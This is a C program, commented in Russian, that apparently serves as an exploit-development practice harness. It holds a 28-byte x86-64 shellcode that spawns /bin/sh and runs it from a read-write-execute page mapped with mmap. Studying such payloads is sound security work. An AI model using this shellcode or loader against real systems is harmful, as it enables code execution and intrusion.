#include <stdio.h>
#include <string.h>
#include <sys/mman.h> // Для mmap
#include <unistd.h>   // Для sysconf
#include <stdlib.h>   // Для exit

// Твой рабочий шелл-код (28 байт)
unsigned char shellcode[] = \
"\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

int main() {
    printf("Shellcode Length: %ld\n", sizeof(shellcode) - 1);

    // 1. Получаем размер страницы памяти (обычно 4096 байт)
    long page_size = sysconf(_SC_PAGESIZE);
    
    // 2. Выделяем память через mmap
    // PROT_EXEC | PROT_READ | PROT_WRITE  -> Разрешаем всё!
    // MAP_ANONYMOUS -> Память только в RAM, не в файле
    void *mem = mmap(NULL, page_size, 
                     PROT_READ | PROT_WRITE | PROT_EXEC, 
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mem == MAP_FAILED) {
        perror("Ошибка mmap");
        exit(1);
    }

    printf("Memory allocated at: %p\n", mem);

    // 3. Копируем шелл-код в эту выделенную область
    memcpy(mem, shellcode, sizeof(shellcode) - 1);
    printf("Shellcode copied to memory.\n");

    // 4. Приводим указатель памяти к типу функции и вызываем её
    printf("Executing shellcode...\n");
    void (*func)() = (void (*)())mem;
    
    func(); // <--- ПРЫЖОК СЮДА

    return 0;
}